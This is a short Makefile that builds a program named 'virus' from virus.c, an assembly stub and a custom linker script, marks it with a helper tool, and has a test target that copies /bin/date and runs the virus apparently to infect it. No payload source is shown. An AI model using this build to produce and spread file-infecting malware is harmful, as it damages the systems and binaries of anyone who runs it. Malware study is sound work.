CFLAGS	= -DDEBUG -Os -fomit-frame-pointer -Wall

all: virus

stub.o: stub.s
	gcc -x assembler-with-cpp -c stub.s -o stub.o

virus.o: virus.c
	gcc $(CFLAGS) -Wno-main -c virus.c -o virus.o

virus: virus.o stub.o
	gcc virus.o stub.o -Wl,-Tvirus.ld,--emit-relocs -o virus
	gcc ../set_mark.c -o set_mark
	./set_mark virus
	-@rm -f set_mark

test: virus
	cp /bin/date .
	-time ./virus
	-./date

clean:
	rm -f virus virus.o stub.o date set_mark ps
